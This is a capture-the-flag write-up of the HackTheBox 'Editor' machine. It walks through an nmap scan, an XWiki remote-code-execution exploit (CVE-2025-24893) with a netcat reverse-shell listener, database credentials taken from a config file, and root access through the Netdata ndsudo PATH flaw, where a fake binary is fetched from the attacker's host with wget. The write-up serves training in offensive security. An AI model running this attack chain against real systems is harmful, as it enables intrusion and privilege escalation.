# HackTheBox - Editor (Write-up)

------------------------------------------------------------------------

## 🔍 Port Scan

``` bash
nmap -sV 10.10.11.80
```

Result:

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    nginx 1.18.0 (Ubuntu)
    8080/tcp open  http    Jetty 10.0.20
    9999/tcp open  abyss?

------------------------------------------------------------------------

## 💥 Exploitation of CVE-2025-24893 (XWiki RCE)

A critical vulnerability was found in XWiki:\
[Exploit -
CVE-2025-24893](https://github.com/Artemir7/CVE-2025-24893-EXP)

Successful test:

``` bash
python CVE-2025-24893.py -u http://wiki.editor.htb -c whoami
[+] Command Output:
xwiki
```

Reverse shell setup:

``` bash
nc -lvnp 4444
```

------------------------------------------------------------------------

## 🔑 Database Credentials

Credentials were leaked in `/etc/wiki/hibernate.cfg.xml`:

    username: xwiki
    password: theEd1t0rTeam99

------------------------------------------------------------------------

## 👤 Initial Access as Oliver

``` bash
oliver@editor:~$ cat user.txt
2739c3049d79c4f20eff7db04ea331f7
```

------------------------------------------------------------------------

## 🚀 Privilege Escalation via Netdata (CVE-2024-32019)

Checking local services revealed that **Netdata** was running on port
`19999`.\
To access it, I created an SSH tunnel:

``` bash
ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
```

When opening the Netdata web panel, a warning appeared indicating the
version was outdated --- a strong hint of a known vulnerability.\
Reference: [Netdata
Advisory](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)

This vulnerability affects the `ndsudo` binary, which can be exploited
due to an insecure `PATH` environment variable.\
By creating a fake `nvme` binary, it is possible to achieve **Local
Privilege Escalation (LPE)**.

Example workflow:

1.  Host the fake binary:

``` bash
python3 -m http.server 5000
```

2.  Download it on the target:

``` bash
wget http://10.10.15.14:5000/nvme
chmod +x /tmp/nvme
```

3.  Inject into PATH and trigger exploit:

``` bash
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Result: root shell obtained.

``` bash
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)

root@editor:/home/oliver# cat /root/root.txt
99b89e8afa5...
```

------------------------------------------------------------------------

## 🏁 Summary

-   ✅ Identified open services with **nmap**\
-   ✅ Exploited **CVE-2025-24893** for RCE in XWiki\
-   ✅ Retrieved database credentials\
-   ✅ Gained initial access as **Oliver**\
-   ✅ Exploited Netdata vulnerability (**CVE-2024-32019**) for
    privilege escalation\
-   ✅ Captured both `user.txt` and `root.txt`

```{=html}
<!-- -->
```
    Status: PWNED 🏴‍☠️
